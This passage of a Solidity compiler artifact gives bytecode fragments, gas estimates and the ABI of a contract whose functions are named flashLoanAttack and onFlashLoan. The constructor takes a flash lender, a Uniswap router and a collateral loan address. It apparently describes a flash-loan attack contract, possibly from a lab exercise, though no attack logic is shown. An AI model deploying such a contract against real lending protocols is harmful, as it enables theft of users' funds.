0x522F691ABD10DF898889F954AA2A7DE270A67BD7F18989498F15 PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "528600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"flashLoanAttack(address,uint256,address)": "infinite",
				"onFlashLoan(address,address,uint256,uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"flashLoanAttack(address,uint256,address)": "08c36455",
			"onFlashLoan(address,address,uint256,uint256)": "f3a78104"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "contract IERC3156FlashLender",
					"name": "lender",
					"type": "address"
				},
				{
					"internalType": "address",
					"name": "uniswapRouterAddress",
					"type": "address"
				},
				{
					"internalType": "address",
					"name": "collateralLoanAddress",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "tokenToFlashLoan",
					"type": "address"
				},
				{
					"internalType": "uint256",
					"name": "amountToFlashLoan",
					"type": "uint256"
				},
				{
					"internalType": "address",
					"name": "tokenToSwap",
					"type": "address"
				}
			],
			"name": "flashLoanAttack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "initiator",
					"type": "address"
				},
				{
					"internalType": "address",
					"name": "tokenToFlashLoan",
					"type": "address"
				},
				{
					"internalType": "uint256",
					"name": "amountToFlashLoan",
					"type": "uint256"
				},
				{
					"internalType": "uint256",
					"name": "fee",
					"type": "uint256"
				}
			],
			"name": "onFlashLoan",
			"outputs": [
				{
					"internalType": "bytes32",
					"name": "",
					"type": "bytes32"
				}
			],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}